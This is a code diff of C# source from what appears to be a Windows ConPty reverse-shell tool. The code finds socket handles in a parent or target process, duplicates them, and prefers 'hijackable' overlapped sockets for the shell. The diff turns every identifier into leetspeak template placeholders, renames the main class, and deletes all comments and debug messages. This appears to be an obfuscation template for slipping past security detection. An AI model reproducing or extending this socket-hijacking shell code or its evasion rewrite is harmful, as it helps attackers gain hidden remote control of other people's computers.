+        WSAPROTOCOL_INFO ${ws4Pr0t0c0l1nf0} = new WSAPROTOCOL_INFO();
+        int ${st4tu5} = WSADuplicateSocket(${s0ck3tH4ndl3}, Process.GetCurrentProcess().Id, ref ${ws4Pr0t0c0l1nf0});
+        if (${st4tu5} == 0)
         {
-            // we need an overlapped socket for the conpty process but we don't need to specify the WSA_FLAG_OVERLAPPED flag here because it will be ignored (and automatically set) by WSASocket() function if we set the WSAPROTOCOL_INFO structure and if the original socket has been created with the overlapped flag.
-            duplicatedSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, 0);
-            if (duplicatedSocket.ToInt64() > 0)
+            ${dup1ic4t3dS0ck3t} = WSASocket(${ws4Pr0t0c0l1nf0}.iAddressFamily, ${ws4Pr0t0c0l1nf0}.iSocketType, ${ws4Pr0t0c0l1nf0}.iProtocol, ref ${ws4Pr0t0c0l1nf0}, 0, 0);
+            if (${dup1ic4t3dS0ck3t}.ToInt64() > 0)
             {
-                retSocket = duplicatedSocket;
+                ${r3tS0ck3t} = ${dup1ic4t3dS0ck3t};
             }
         }
-        return retSocket;
+        return ${r3tS0ck3t};
     }
 
-    //helper method with "dynamic" buffer allocation
-    public static IntPtr NtQueryObjectDynamic(IntPtr handle, OBJECT_INFORMATION_CLASS infoClass, int infoLength)
+    public static IntPtr NtQueryObjectDynamic(IntPtr ${h4ndl3}, OBJECT_INFORMATION_CLASS ${1nf0Cl455}, int ${1nf0L3ngth})
     {
-        if (infoLength == 0)
-            infoLength = Marshal.SizeOf(typeof(int));
-        IntPtr infoPtr = Marshal.AllocHGlobal(infoLength);
-        uint result;
+        if (${1nf0L3ngth} == 0)
+            ${1nf0L3ngth} = Marshal.SizeOf(typeof(int));
+        IntPtr ${1nf0Ptr} = Marshal.AllocHGlobal(${1nf0L3ngth});
+        uint ${r3sult};
         while (true)
         {
-            result = (uint)NtQueryObject(handle, infoClass, infoPtr, (uint)infoLength, ref infoLength);
-            if (result == NTSTATUS_INFOLENGTHMISMATCH || result == NTSTATUS_BUFFEROVERFLOW || result == NTSTATUS_BUFFERTOOSMALL)
+            ${r3sult} = (uint)NtQueryObject(${h4ndl3}, ${1nf0Cl455}, ${1nf0Ptr}, (uint)${1nf0L3ngth}, ref ${1nf0L3ngth});
+            if (${r3sult} == ${NTST4TUS1NF0L3NGTHM1SM4TCH} || ${r3sult} == ${NTST4TUSBUFF3R0V3RFL0W} || ${r3sult} == ${NTST4TUSBUFF3RT005M4LL})
             {
-                Marshal.FreeHGlobal(infoPtr);
-                infoPtr = Marshal.AllocHGlobal((int)infoLength);
+                Marshal.FreeHGlobal(${1nf0Ptr});
+                ${1nf0Ptr} = Marshal.AllocHGlobal((int)${1nf0L3ngth});
                 continue;
             }
-            else if (result == NTSTATUS_SUCCESS)
+            else if (${r3sult} == ${NTST4TUSSUCC355})
                 break;
             else
             {
-                //throw new Exception("Unhandled NtStatus " + result);
                 break;
             }
         }
-        if (result == NTSTATUS_SUCCESS)
-            return infoPtr;//don't forget to free the pointer with Marshal.FreeHGlobal after you're done with it
+        if (${r3sult} == ${NTST4TUSSUCC355})
+            return ${1nf0Ptr};
         else
-            Marshal.FreeHGlobal(infoPtr);//free pointer when not Successful
+            Marshal.FreeHGlobal(${1nf0Ptr});
         return IntPtr.Zero;
     }
 
-    public static List<IntPtr> GetSocketsTargetProcess(Process targetProcess)
+    public static List<IntPtr> GetSocketsTargetProcess(Process ${t4rg3tPr0c355})
     {
-        OBJECT_NAME_INFORMATION objNameInfo;
-        long HandlesCount = 0;
-        IntPtr dupHandle;
-        IntPtr ptrObjectName;
-        IntPtr ptrHandlesInfo;
-        IntPtr hTargetProcess;
-        string strObjectName;
-        List<IntPtr> socketsHandles = new List<IntPtr>();
-        DeadlockCheckHelper deadlockCheckHelperObj = new DeadlockCheckHelper();
-        hTargetProcess = OpenProcess(PROCESS_DUP_HANDLE, false, targetProcess.Id);
-        if (hTargetProcess == IntPtr.Zero)
+        OBJECT_NAME_INFORMATION ${0bjN4m31nf0};
+        long ${H4ndl35C0unt} = 0;
+        IntPtr ${dupH4ndl3};
+        IntPtr ${ptr0bj3ctN4m3};
+        IntPtr ${ptrH4ndl35Inf0};
+        IntPtr ${hT4rg3tPr0c355};
+        string ${str0bj3ctN4m3};
+        List<IntPtr> ${s0ck3t5H4ndl35} = new List<IntPtr>();
+        DeadlockCheckHelper ${d34dl0ckCh3ckH3lp3r0bj} = new DeadlockCheckHelper();
+        ${hT4rg3tPr0c355} = OpenProcess(${PR0C355DUPH4NDL3}, false, ${t4rg3tPr0c355}.Id);
+        if (${hT4rg3tPr0c355} == IntPtr.Zero)
         {
-            Console.WriteLine("Cannot open target process with pid " + targetProcess.Id.ToString() + " for DuplicateHandle access");
-            return socketsHandles;
+            return ${s0ck3t5H4ndl35};
         }
-        ptrHandlesInfo = NtQuerySystemInformationDynamic(SystemHandleInformation, 0);
-        HandlesCount = Marshal.ReadIntPtr(ptrHandlesInfo).ToInt64();
-        // create a pointer at the beginning of the address of SYSTEM_HANDLE_TABLE_ENTRY_INFO[]
-        IntPtr ptrHandlesInfoCurrent = new IntPtr(ptrHandlesInfo.ToInt64() + IntPtr.Size);
-        // get TypeIndex for "File" objects, needed to filter only sockets objects
-        byte TypeIndexFileObject = GetTypeIndexByName("File");
-        for (int i = 0; i < HandlesCount; i++)
+        ${ptrH4ndl35Inf0} = NtQuerySystemInformationDynamic(${Syst3mH4ndl31nf0rm4t10n}, 0);
+        ${H4ndl35C0unt} = Marshal.ReadIntPtr(${ptrH4ndl35Inf0}).ToInt64();
+        IntPtr ${ptrH4ndl35Inf0Curr3nt} = new IntPtr(${ptrH4ndl35Inf0}.ToInt64() + IntPtr.Size);
+        byte ${Typ31nd3xF1l30bj3ct} = GetTypeIndexByName("File");
+        for (int ${1} = 0; ${1} < ${H4ndl35C0unt}; ${1}++)
         {
-            SYSTEM_HANDLE_TABLE_ENTRY_INFO sysHandle;
+            SYSTEM_HANDLE_TABLE_ENTRY_INFO ${syst4mH4ndl3};
             try
             {
-                sysHandle = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)Marshal.PtrToStructure(ptrHandlesInfoCurrent, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
+                ${syst4mH4ndl3} = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)Marshal.PtrToStructure(${ptrH4ndl35Inf0Curr3nt}, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
             }
             catch
             {
                 break;
             }
-            //move pointer to next SYSTEM_HANDLE_TABLE_ENTRY_INFO
-            ptrHandlesInfoCurrent = (IntPtr)(ptrHandlesInfoCurrent.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO)));
-            if (sysHandle.UniqueProcessId != targetProcess.Id || sysHandle.ObjectTypeIndex != TypeIndexFileObject)
+            ${ptrH4ndl35Inf0Curr3nt} = (IntPtr)(${ptrH4ndl35Inf0Curr3nt}.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO)));
+            if (${syst4mH4ndl3}.UniqueProcessId != ${t4rg3tPr0c355}.Id || ${syst4mH4ndl3}.ObjectTypeIndex != ${Typ31nd3xF1l30bj3ct})
                 continue;
-            if (DuplicateHandle(hTargetProcess, (IntPtr)sysHandle.HandleValue, GetCurrentProcess(), out dupHandle, 0, false, DUPLICATE_SAME_ACCESS))
+            if (DuplicateHandle(${hT4rg3tPr0c355}, (IntPtr)${syst4mH4ndl3}.HandleValue, GetCurrentProcess(), out ${dupH4ndl3}, 0, false, ${DUPL1C4T3S4M34CC355}))
             {
-                if (deadlockCheckHelperObj.CheckDeadlockDetected(dupHandle))
-                { // this will avoids deadlocks on special named pipe handles
-                    // Console.WriteLine("debug: Deadlock detected");
-                    CloseHandle(dupHandle);
+                if (${d34dl0ckCh3ckH3lp3r0bj}.CheckDeadlockDetected(${dupH4ndl3}))
+                {
+                    CloseHandle(${dupH4ndl3});
                     continue;
                 }
-                ptrObjectName = NtQueryObjectDynamic(dupHandle, OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
-                if (ptrObjectName == IntPtr.Zero)
+                ${ptr0bj3ctN4m3} = NtQueryObjectDynamic(${dupH4ndl3}, OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
+                if (${ptr0bj3ctN4m3} == IntPtr.Zero)
                 {
-                    CloseHandle(dupHandle);
+                    CloseHandle(${dupH4ndl3});
                     continue;
                 }
                 try
                 {
-                    objNameInfo = (OBJECT_NAME_INFORMATION)Marshal.PtrToStructure(ptrObjectName, typeof(OBJECT_NAME_INFORMATION));
+                    ${0bjN4m31nf0} = (OBJECT_NAME_INFORMATION)Marshal.PtrToStructure(${ptr0bj3ctN4m3}, typeof(OBJECT_NAME_INFORMATION));
                 }
                 catch
                 {
-                    CloseHandle(dupHandle);
+                    CloseHandle(${dupH4ndl3});
                     continue;
                 }
-                if (objNameInfo.Name.Buffer != IntPtr.Zero && objNameInfo.Name.Length > 0)
+                if (${0bjN4m31nf0}.Name.Buffer != IntPtr.Zero && ${0bjN4m31nf0}.Name.Length > 0)
                 {
-                    strObjectName = Marshal.PtrToStringUni(objNameInfo.Name.Buffer, objNameInfo.Name.Length / 2);
-                    // Console.WriteLine("debug: file handle 0x" + dupHandle.ToString("X4") + " strObjectName = " + strObjectName);
-                    if (strObjectName == "\\Device\\Afd")
-                        socketsHandles.Add(dupHandle);
+                    ${str0bj3ctN4m3} = Marshal.PtrToStringUni(${0bjN4m31nf0}.Name.Buffer, ${0bjN4m31nf0}.Name.Length / 2);
+                    if (${str0bj3ctN4m3} == "\\Device\\Afd")
+                        ${s0ck3t5H4ndl35}.Add(${dupH4ndl3});
                     else
-                        CloseHandle(dupHandle);
+                        CloseHandle(${dupH4ndl3});
                 }
                 else
-                    CloseHandle(dupHandle);
-                Marshal.FreeHGlobal(ptrObjectName);
-                ptrObjectName = IntPtr.Zero;
+                    CloseHandle(${dupH4ndl3});
+                Marshal.FreeHGlobal(${ptr0bj3ctN4m3});
+                ${ptr0bj3ctN4m3} = IntPtr.Zero;
             }
         }
-        Marshal.FreeHGlobal(ptrHandlesInfo);
-        List<IntPtr> dupedSocketsHandles = DuplicateSocketsFromHandles(socketsHandles);
-        if (dupedSocketsHandles.Count >= 1)
-            dupedSocketsHandles = FilterAndOrderSocketsByBytesIn(dupedSocketsHandles);
-        socketsHandles = dupedSocketsHandles;
-        return socketsHandles;
+        Marshal.FreeHGlobal(${ptrH4ndl35Inf0});
+        List<IntPtr> ${dup3dS0ck3t5H4ndl35} = DuplicateSocketsFromHandles(${s0ck3t5H4ndl35});
+        if (${dup3dS0ck3t5H4ndl35}.Count >= 1)
+            ${dup3dS0ck3t5H4ndl35} = FilterAndOrderSocketsByBytesIn(${dup3dS0ck3t5H4ndl35});
+        ${s0ck3t5H4ndl35} = ${dup3dS0ck3t5H4ndl35};
+        return ${s0ck3t5H4ndl35};
     }
 
-    public static bool IsSocketInherited(IntPtr socketHandle, Process parentProcess)
+    public static bool IsSocketInherited(IntPtr ${s0ck3tH4ndl3}, Process ${p4r3ntPr0c355})
     {
-        bool inherited = false;
-        List<IntPtr> parentSocketsHandles = GetSocketsTargetProcess(parentProcess);
-        if (parentSocketsHandles.Count < 1)
-            return inherited;
-        foreach (IntPtr parentSocketHandle in parentSocketsHandles)
+        bool ${1nh3r1t3d} = false;
+        List<IntPtr> ${p4r3ntS0ck3t5H4ndl35} = GetSocketsTargetProcess(${p4r3ntPr0c355});
+        if (${p4r3ntS0ck3t5H4ndl35}.Count < 1)
+            return ${1nh3r1t3d};
+        foreach (IntPtr ${p4r3ntS0ck3tH4ndl3} in ${p4r3ntS0ck3t5H4ndl35})
         {
-            SOCKADDR_IN sockaddrTargetProcess = new SOCKADDR_IN();
-            SOCKADDR_IN sockaddrParentProcess = new SOCKADDR_IN();
-            int sockaddrTargetProcessLen = Marshal.SizeOf(sockaddrTargetProcess);
-            int sockaddrParentProcessLen = Marshal.SizeOf(sockaddrParentProcess);
+            SOCKADDR_IN ${s0ck4ddrT4rg3tPr0c355} = new SOCKADDR_IN();
+            SOCKADDR_IN ${s0ck4ddrP4r3ntPr0c355} = new SOCKADDR_IN();
+            int ${s0ck4ddrT4rg3tPr0c355L3n} = Marshal.SizeOf(${s0ck4ddrT4rg3tPr0c355});
+            int ${s0ck4ddrP4r3ntPr0c355L3n} = Marshal.SizeOf(${s0ck4ddrP4r3ntPr0c355});
             if (
-                (getpeername(socketHandle, ref sockaddrTargetProcess, ref sockaddrTargetProcessLen) == 0) &&
-                (getpeername(parentSocketHandle, ref sockaddrParentProcess, ref sockaddrParentProcessLen) == 0) &&
-                (sockaddrTargetProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrTargetProcess.sin_port == sockaddrParentProcess.sin_port)
+                (getpeername(${s0ck3tH4ndl3}, ref ${s0ck4ddrT4rg3tPr0c355}, ref ${s0ck4ddrT4rg3tPr0c355L3n}) == 0) &&
+                (getpeername(${p4r3ntS0ck3tH4ndl3}, ref ${s0ck4ddrP4r3ntPr0c355}, ref ${s0ck4ddrP4r3ntPr0c355L3n}) == 0) &&
+                (${s0ck4ddrT4rg3tPr0c355}.sin_addr == ${s0ck4ddrP4r3ntPr0c355}.sin_addr && ${s0ck4ddrT4rg3tPr0c355}.sin_port == ${s0ck4ddrP4r3ntPr0c355}.sin_port)
                )
             {
-                // Console.WriteLine("debug: found inherited socket! handle --> 0x" + parentSocketHandle.ToString("X4"));
-                inherited = true;
+                ${1nh3r1t3d} = true;
             }
-            closesocket(parentSocketHandle);
+            closesocket(${p4r3ntS0ck3tH4ndl3});
         }
-        return inherited;
+        return ${1nh3r1t3d};
     }
 
-    public static bool IsSocketOverlapped(IntPtr socket)
+    public static bool IsSocketOverlapped(IntPtr ${s0ck3t})
     {
-        bool ret = false;
-        IntPtr sockEvent = IntPtr.Zero;
-        int ntStatus = -1;
-        SOCKET_CONTEXT contextData = new SOCKET_CONTEXT();
-        ntStatus = NtCreateEvent(ref sockEvent, EVENT_ALL_ACCESS, IntPtr.Zero, SynchronizationEvent, false);
-        if (ntStatus != NTSTATUS_SUCCESS)
+        bool ${r3t} = false;
+        IntPtr ${s0ck3v3nt} = IntPtr.Zero;
+        int ${ntSt4tu5} = -1;
+        SOCKET_CONTEXT ${c0nt3xtD4t4} = new SOCKET_CONTEXT();
+        ${ntSt4tu5} = NtCreateEvent(ref ${s0ck3v3nt}, ${3V3NT4LL4CC355}, IntPtr.Zero, ${Synchr0n1z4t10n3v3nt}, false);
+        if (${ntSt4tu5} != ${NTST4TUSSUCC355})
         {
-            // Console.WriteLine("debug: NtCreateEvent failed with error code 0x" + ntStatus.ToString("X8")); ;
-            return ret;
+            return ${r3t};
         }
-        IO_STATUS_BLOCK IOSB = new IO_STATUS_BLOCK();
-        ntStatus = NtDeviceIoControlFile1(socket, sockEvent, IntPtr.Zero, IntPtr.Zero, ref IOSB, IOCTL_AFD_GET_CONTEXT, IntPtr.Zero, 0, ref contextData, Marshal.SizeOf(contextData));
-        // Wait for Completion 
-        if (ntStatus == NTSTATUS_PENDING)
+        IO_STATUS_BLOCK ${10SB} = new IO_STATUS_BLOCK();
+        ${ntSt4tu5} = NtDeviceIoControlFile1(${s0ck3t}, ${s0ck3v3nt}, IntPtr.Zero, IntPtr.Zero, ref ${10SB}, ${10CTL4FDG3TC0NT3XT}, IntPtr.Zero, 0, ref ${c0nt3xtD4t4}, Marshal.SizeOf(${c0nt3xtD4t4}));
+        if (${ntSt4tu5} == ${NTST4TUSP3ND1NG})
         {
-            WaitForSingleObject(sockEvent, INFINITE);
-            ntStatus = IOSB.status;
+            WaitForSingleObject(${s0ck3v3nt}, ${1NF1N1T3});
+            ${ntSt4tu5} = ${10SB}.status;
         }
-        CloseHandle(sockEvent);
+        CloseHandle(${s0ck3v3nt});
 
-        if (ntStatus != NTSTATUS_SUCCESS)
+        if (${ntSt4tu5} != ${NTST4TUSSUCC355})
         {
-            // Console.WriteLine("debug: NtDeviceIoControlFile failed with error code 0x" + ntStatus.ToString("X8")); ;
-            return ret;
+            return ${r3t};
         }
-        if ((contextData.SharedData.CreationFlags & WSA_FLAG_OVERLAPPED) != 0) ret = true;
-        return ret;
+        if ((${c0nt3xtD4t4}.SharedData.CreationFlags & ${WSAFL4G0V3RL4PP3D}) != 0) ${r3t} = true;
+        return ${r3t};
     }
 
-    public static IntPtr DuplicateTargetProcessSocket(Process targetProcess, ref bool overlappedSocket)
+    public static IntPtr DuplicateTargetProcessSocket(Process ${t4rg3tPr0c355}, ref bool ${0v3rl4pp3dS0ck3t})
     {
-        IntPtr targetSocketHandle = IntPtr.Zero;
-        List<IntPtr> targetProcessSockets = GetSocketsTargetProcess(targetProcess);
-        if (targetProcessSockets.Count < 1) return targetSocketHandle;
+        IntPtr ${t4rg3tS0ck3tH4ndl3} = IntPtr.Zero;
+        List<IntPtr> ${t4rg3tPr0c355S0ck3t5} = GetSocketsTargetProcess(${t4rg3tPr0c355});
+        if (${t4rg3tPr0c355S0ck3t5}.Count < 1) return ${t4rg3tS0ck3tH4ndl3};
         else
         {
-            foreach (IntPtr socketHandle in targetProcessSockets)
+            foreach (IntPtr ${s0ck3tH4ndl3} in ${t4rg3tPr0c355S0ck3t5})
             {
-                // we prioritize the hijacking of Overlapped sockets
-                if (!IsSocketOverlapped(socketHandle))
+                if (!IsSocketOverlapped(${s0ck3tH4ndl3}))
                 {
-                    // Console.WriteLine("debug: Found a usable socket, but it has not been created with the flag WSA_FLAG_OVERLAPPED, skipping...");
                     continue;
                 }
-                targetSocketHandle = socketHandle;
-                overlappedSocket = true;
+                ${t4rg3tS0ck3tH4ndl3} = ${s0ck3tH4ndl3};
+                ${0v3rl4pp3dS0ck3t} = true;
                 break;
             }
-            // no Overlapped sockets found, expanding the scope by including also Non-Overlapped sockets
-            if (targetSocketHandle == IntPtr.Zero) {
-                // Console.WriteLine("debug: No overlapped sockets found. Trying to return also non-overlapped sockets...");
-                foreach (IntPtr socketHandle in targetProcessSockets)
+            if (${t4rg3tS0ck3tH4ndl3} == IntPtr.Zero) {
+                foreach (IntPtr ${s0ck3tH4ndl3} in ${t4rg3tPr0c355S0ck3t5})
                 {
-                    targetSocketHandle = socketHandle;
-                    if (!IsSocketOverlapped(targetSocketHandle)) overlappedSocket = false;
+                    ${t4rg3tS0ck3tH4ndl3} = ${s0ck3tH4ndl3};
+                    if (!IsSocketOverlapped(${t4rg3tS0ck3tH4ndl3})) ${0v3rl4pp3dS0ck3t} = false;
                     break;
                 }
             }
         }
-        if (targetSocketHandle == IntPtr.Zero)
-            throw new CONTsException("No sockets found, so no hijackable sockets :( Exiting...");
-        return targetSocketHandle;
+        if (${t4rg3tS0ck3tH4ndl3} == IntPtr.Zero)
+            throw new CPTSHException("No sockets found, so no hijackable sockets :( Exiting...");
+        return ${t4rg3tS0ck3tH4ndl3};
     }
-    public static void SetSocketBlockingMode(IntPtr socket, int mode)
+    public static void SetSocketBlockingMode(IntPtr ${s0ck3t}, int ${m0d3})
     {
-        int FIONBIO = -2147195266;
-        int NonBlockingMode = 1;
-        int BlockingMode = 0;
-        int result;
-        if (mode == 1)
-            result = ioctlsocket(socket, FIONBIO, ref NonBlockingMode);
+        int ${F10NB10} = -2147195266;
+        int ${N0nBl0ck1ngM0d3} = 1;
+        int ${Bl0ck1ngM0d3} = 0;
+        int ${r3sult};
+        if (${m0d3} == 1)
+            ${r3sult} = ioctlsocket(${s0ck3t}, ${F10NB10}, ref ${N0nBl0ck1ngM0d3});
         else
-            result = ioctlsocket(socket, FIONBIO, ref BlockingMode);
-        if (result == -1)
-            throw new CONTsException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
+            ${r3sult} = ioctlsocket(${s0ck3t}, ${F10NB10}, ref ${Bl0ck1ngM0d3});
+        if (${r3sult} == -1)
+            throw new CPTSHException("ioctlsocket failed with return code " + ${r3sult}.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
     }
 }
 
-// source from --> https://stackoverflow.com/a/3346055
 [StructLayout(LayoutKind.Sequential)]
 public struct ParentProcessUtilities
 {
-    // These members must match PROCESS_BASIC_INFORMATION
     internal IntPtr Reserved1;
     internal IntPtr PebBaseAddress;
     internal IntPtr Reserved2_0;
@@ -830,62 +761,60 @@ public struct ParentProcessUtilities
     internal IntPtr InheritedFromUniqueProcessId;
 
     [DllImport("ntdll.dll")]
-    private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref ParentProcessUtilities processInformation, int processInformationLength, out int returnLength);
+    private static extern int NtQueryInformationProcess(IntPtr ${pr0c355H4ndl3}, int ${pr0c3551nf0rm4t10nCl455}, ref ParentProcessUtilities ${pr0c3551nf0rm4t10n}, int ${pr0c3551nf0rm4t10nL3ngth}, out int ${r3turnL3ngth});
 
     public static Process GetParentProcess()
     {
         return GetParentProcess(Process.GetCurrentProcess().Handle);
     }
 
-    public static Process GetParentProcess(int id)
+    public static Process GetParentProcess(int ${1d})
     {
-        Process process = Process.GetProcessById(id);
-        return GetParentProcess(process.Handle);
+        Process ${pr0c355} = Process.GetProcessById(${1d});
+        return GetParentProcess(${pr0c355}.Handle);
     }
 
-    public static Process GetParentProcess(IntPtr handle)
+    public static Process GetParentProcess(IntPtr ${h4ndl3})
     {
-        ParentProcessUtilities pbi = new ParentProcessUtilities();
-        int returnLength;
-        int status = NtQueryInformationProcess(handle, 0, ref pbi, Marshal.SizeOf(pbi), out returnLength);
-        if (status != 0)
-            throw new CONTsException(status.ToString());
+        ParentProcessUtilities ${pb1} = new ParentProcessUtilities();
+        int ${r3turnL3ngth};
+        int ${st4tu5} = NtQueryInformationProcess(${h4ndl3}, 0, ref ${pb1}, Marshal.SizeOf(${pb1}), out ${r3turnL3ngth});
+        if (${st4tu5} != 0)
+            throw new CPTSHException(${st4tu5}.ToString());
         try
         {
-            return Process.GetProcessById(pbi.InheritedFromUniqueProcessId.ToInt32());
+            return Process.GetProcessById(${pb1}.InheritedFromUniqueProcessId.ToInt32());
         }
         catch (ArgumentException)
         {
-            // not found
             return null;
         }
     }
 }
 
-public static class CONTs
+public static class CPTSH
 {
-    private const string errorString = "{{{CONTsException}}}\r\n";
-    private const uint ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004;
-    private const uint DISABLE_NEWLINE_AUTO_RETURN = 0x0008;
-    private const uint PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;
-    private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
-    private const int STARTF_USESTDHANDLES = 0x00000100;
-    private const int BUFFER_SIZE_PIPE = 1048576;
-    private const int WSA_FLAG_OVERLAPPED = 0x1;
-    private const UInt32 INFINITE = 0xFFFFFFFF;
-    private const int SW_HIDE = 0;
-    private const uint GENERIC_READ = 0x80000000;
-    private const uint GENERIC_WRITE = 0x40000000;
-    private const uint FILE_SHARE_READ = 0x00000001;
-    private const uint FILE_SHARE_WRITE = 0x00000002;
-    private const uint FILE_ATTRIBUTE_NORMAL = 0x80;
-    private const uint OPEN_EXISTING = 3;
-    private const int STD_INPUT_HANDLE = -10;
-    private const int STD_OUTPUT_HANDLE = -11;
-    private const int STD_ERROR_HANDLE = -12;
-    private const int WSAEWOULDBLOCK = 10035;
-    private const int FD_READ = (1 << 0);
-
+    private const string ${3rr0rStr1ng} = "{{{CPTSHException}}}\r\n";
+    private const uint ${3N4BL3V1RTU4LT3RM1N4LPR0C3551NG} = 0x0004;
+    private const uint ${D1S4BL3N3WL1N34UT0R3TURN} = 0x0008;
+    private const uint ${PR0CTHR34D4TTR1BUT3P53UD0C0NS0L3} = 0x00020016;
+    private const uint ${3XT3ND3DST4RTUP1NF0PR3S3NT} = 0x00080000;
+    private const int ${ST4RTFUS3STDH4NDL35} = 0x00000100;
+    private const int ${BUFF3RS1Z3P1P3} = 1048576;
+    private const int ${WSAFL4G0V3RL4PP3D} = 0x1;
+    private const UInt32 ${1NF1N1T3} = 0xFFFFFFFF;
+    private const int ${SWH1D3} = 0;
+    private const uint ${G3N3R1CR34D} = 0x80000000;
+    private const uint ${G3N3R1CWR1T3} = 0x40000000;
+    private const uint ${F1L3SH4R3R34D} = 0x00000001;
+    private const uint ${F1L3SH4R3WR1T3} = 0x00000002;
+    private const uint ${F1L34TTR1BUT3N0RM4L} = 0x80;
+    private const uint ${0P3N3X1ST1NG} = 3;
+    private const int ${STD1NPUTH4NDL3} = -10;
+    private const int ${STD0UTPUTH4NDL3} = -11;
+    private const int ${STD3RR0RH4NDL3} = -12;
+    private const int ${WSA3WOULDBL0CK} = 10035;
+    private const int ${FDR34D} = (1 << 0);
 
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     private struct STARTUPINFOEX
@@ -941,83 +870,60 @@ public static class CONTs
         public short Y;
     }
 
-    [StructLayout(LayoutKind.Sequential)]
-    private struct WSAData
-    {
-        public short wVersion;
-        public short wHighVersion;
-        public short iMaxSockets;
-        public short iMaxUdpDg;
-        public IntPtr lpVendorInfo;
-        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
-        public string szDescription;
-        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
-        public string szSystemStatus;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    private struct SOCKADDR_IN
-    {
-        public short sin_family;
-        public short sin_port;
-        public uint sin_addr;
-        public long sin_zero;
-    }
+    [DllImport("kernel32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool InitializeProcThreadAttributeList(IntPtr ${lp4ttr1but3L1st}, int ${dw4ttr1but3C0unt}, int ${dwFl4g5}, ref IntPtr ${lpS1z3});
 
     [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
+    private static extern bool UpdateProcThreadAttribute(IntPtr ${lp4ttr1but3L1st}, uint ${dwFl4g5}, IntPtr ${4ttr1but3}, IntPtr ${lpV4lu3}, IntPtr ${cbS1z3}, IntPtr ${lpPr3v10usV4lu3}, IntPtr ${lpR3turnS1z3});
 
     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
     [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool CreateProcessEx(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+    private static extern bool CreateProcessEx(string ${lp4pp1ic4t10nN4m3}, string ${lpC0mm4ndL1n3}, ref SECURITY_ATTRIBUTES ${lpPr0c3554ttr1but35}, ref SECURITY_ATTRIBUTES ${lpThr34d4ttr1but35}, bool ${b1nh3r1tH4ndl35}, uint ${dwCr34t10nFl4g5}, IntPtr ${lp3nv1r0nm3nt}, string ${lpCurr3ntD1r3ct0ry}, [In] ref STARTUPINFOEX ${lpSt4rtup1nf0}, out PROCESS_INFORMATION ${lpPr0c3551nf0rm4t10n});
 
     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
-    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+    private static extern bool CreateProcess(string ${lp4pp1ic4t10nN4m3}, string ${lpC0mm4ndL1n3}, IntPtr ${lpPr0c3554ttr1but35}, IntPtr ${lpThr34d4ttr1but35}, bool ${b1nh3r1tH4ndl35}, uint ${dwCr34t10nFl4g5}, IntPtr ${lp3nv1r0nm3nt}, string ${lpCurr3ntD1r3ct0ry}, [In] ref STARTUPINFO ${lpSt4rtup1nf0}, out PROCESS_INFORMATION ${lpPr0c3551nf0rm4t10n});
 
     [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
+    private static extern bool TerminateProcess(IntPtr ${hPr0c355}, uint ${u3x1tC0d3});
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+    private static extern UInt32 WaitForSingleObject(IntPtr ${hH4ndl3}, UInt32 ${dwM1ll153c0nd5});
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);
+    private static extern bool SetStdHandle(int ${nStdH4ndl3}, IntPtr ${hH4ndl3});
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr GetStdHandle(int nStdHandle);
+    private static extern IntPtr GetStdHandle(int ${nStdH4ndl3});
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool CloseHandle(IntPtr hObject);
